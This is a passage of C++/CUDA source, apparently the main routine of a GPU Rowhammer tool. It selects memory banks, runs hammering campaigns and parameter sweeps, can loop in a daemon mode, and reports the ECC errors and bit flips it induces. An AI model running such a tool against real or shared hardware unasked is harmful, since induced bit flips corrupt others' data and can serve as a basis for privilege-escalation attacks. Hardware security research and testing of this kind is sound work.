                                       256, cfg.scan_samples, cfg.verbose);
        }
    }

    printf("\nBanks ready: %zu\n", banks.size());
    for (int i = 0; i < (int)banks.size(); i++)
        printf("  [%d] ref=0x%lx  rows=%zu\n",
               i, (unsigned long)banks[i].ref_offset, banks[i].rows.size());

    bool any_usable = false;
    for (auto &bk : banks)
        if ((int)bk.rows.size() >= cfg.n_sided * cfg.distance)
            any_usable = true;

    if (!any_usable) {
        fprintf(stderr, "\nNo bank has enough rows for the requested pattern.\n"
                        "Try --stride <value> or reduce --pattern / --distance.\n");
        CUDA_CHECK(cudaFree(d_mem));
        ecc.fini();
        return 1;
    }

    // ---- Hammer ----
    CampaignStats stats;
    int run = 0;

    auto do_run = [&](int ns, int dist, uint8_t vp, uint8_t ap,
                       const char *label) {
        // Adjust k/m for this n_sided
        int k = cfg.k_warps;
        int m = ns / k;
        if (ns % k != 0) { m++; ns = k * m; }

        if (label)
            printf("\n>>>>> Sweep: %s <<<<<\n", label);

        run_campaign(d_mem, alloc_sz, banks,
                     ns, dist, vp, ap,
                     k, m, cfg.rounds, cfg.sync_delay,
                     cfg.duration_ms, cfg.max_iters,
                     cfg.verbose, ecc, stats);
    };

    if (cfg.daemon) {
        printf("\n*** DAEMON MODE – Press Ctrl+C to stop ***\n");
        while (!g_stop) {
            run++;
            printf("\n\n========== RUN %d [%s] ==========\n", run, timestamp());
            double t0 = now_sec();

            if (cfg.sweep) {
                for (int si = 0; si < SWEEP_COUNT && !g_stop; si++) {
                    const SweepEntry &se = SWEEP_TABLE[si];
                    do_run(se.n_sided, se.distance, se.victim,
                           se.aggressor, se.label);
                }
            } else {
                do_run(cfg.n_sided, cfg.distance, cfg.victim,
                       cfg.aggressor, NULL);
            }

            double elapsed = now_sec() - t0;
            printf("\nRun %d completed in %.1f s\n", run, elapsed);

            if (stats.ecc_events > 0 || stats.bitflips > 0) {
                printf("\n*** ERRORS DETECTED – re-running to confirm "
                       "reproducibility ***\n");
                ECCSnap es = ecc.snap();
                ecc.print(es);
            }

            if (g_stop) break;
            printf("Cooling down %d s...\n", cfg.cooldown);
            for (int i = 0; i < cfg.cooldown && !g_stop; i++) sleep(1);
        }
    } else {
        if (cfg.sweep) {
            for (int si = 0; si < SWEEP_COUNT && !g_stop; si++) {
                const SweepEntry &se = SWEEP_TABLE[si];
                do_run(se.n_sided, se.distance, se.victim,
                       se.aggressor, se.label);
            }
        } else {
            do_run(cfg.n_sided, cfg.distance, cfg.victim,
                   cfg.aggressor, NULL);
        }
    }

    // ---- Final report ----
    printf("\n==========================================================\n");
    printf("  FINAL REPORT\n");
    printf("==========================================================\n");
    printf("  Runs completed:        %d\n", run > 0 ? run : 1);
    printf("  ECC errors triggered:  %d\n", stats.ecc_events);
    printf("  Bit flips detected:    %d\n", stats.bitflips);
    if (ecc.ready) {
        ECCSnap sf = ecc.snap();
        printf("  Final ECC state:\n");
        ecc.print(sf);
    }
    printf("==========================================================\n");

    CUDA_CHECK(cudaFree(d_mem));
    ecc.fini();

    return (stats.ecc_events > 0 || stats.bitflips > 0) ? 0 : 1;
}
